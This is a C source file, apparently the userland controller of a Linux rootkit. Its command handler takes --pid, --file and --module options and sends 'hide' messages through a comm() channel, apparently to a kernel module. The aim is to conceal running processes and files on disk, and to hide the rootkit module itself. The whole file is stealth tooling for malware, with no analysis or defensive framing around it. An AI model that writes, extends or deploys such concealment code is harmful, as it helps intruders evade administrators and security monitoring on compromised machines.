#define _GNU_SOURCE

#include <status.h>
#include <comm.h>
#include <module/hide.h>
#include <lib/ketopt.h>

#include <sys/types.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>

enum { opt_hide_pid, opt_hide_file, opt_hide_module };

static const ko_longopt_t hide_longopts[] = {
	{ "pid", ko_required_argument, opt_hide_pid },
	{ "file", ko_required_argument, opt_hide_file },
	{ "module", ko_no_argument, opt_hide_module },
	{ NULL, 0, 0 }
};

static int hide_process(pid_t pid)
{
	char *msg;
	int ret = asprintf(&msg, "hide --pid %d", pid);
	if (ret < 0)
		return ret;

	ret = comm(msg, strlen(msg));
	free(msg);

	return ret;
}

static int hide_file(char *path)
{
	char *msg;
	int ret = asprintf(&msg, "hide --file %s", path);
	if (ret < 0)
		return ret;

	ret = comm(msg, strlen(msg));
	free(msg);

	return ret;
}

static int hide_module(void)
{
	char *msg = "hide --module";
	return comm(msg, strlen(msg));
}

int hide_command_handler(int argc, char **argv)
{
	pid_t pid = -1;
	char *file = NULL;
	bool hide_mod = false;

	int ret = 0;

	int c;
	ketopt_t o = KETOPT_INIT;
	while ((c = ketopt(&o, argc, argv, 1, "", hide_longopts)) >= 0) {
		switch (c) {
		case opt_hide_pid:
			if (o.arg) {
				/* There is no good way to perform error
				 * detection here. The function strtol would
				 * need to be truncated. */
				pid = atoi(o.arg);
			}
			break;
		case opt_hide_file:
			if (o.arg) {
				/* The file argument should be a single string. */
				file = o.arg;
			}
			break;
		case opt_hide_module:
			hide_mod = true;
			break;
		}
	}

	if (pid == -1 && file == NULL && !hide_mod) {
		error("No flags provided.\n");
		return -1;
	}

	if (pid != -1) {
		ret = hide_process(pid);
		if (ret)
			return ret;
	}

	if (file != NULL) {
		ret = hide_file(file);
		if (ret)
			return ret;
	}

	if (hide_mod)
		return hide_module();

	return 0;
}
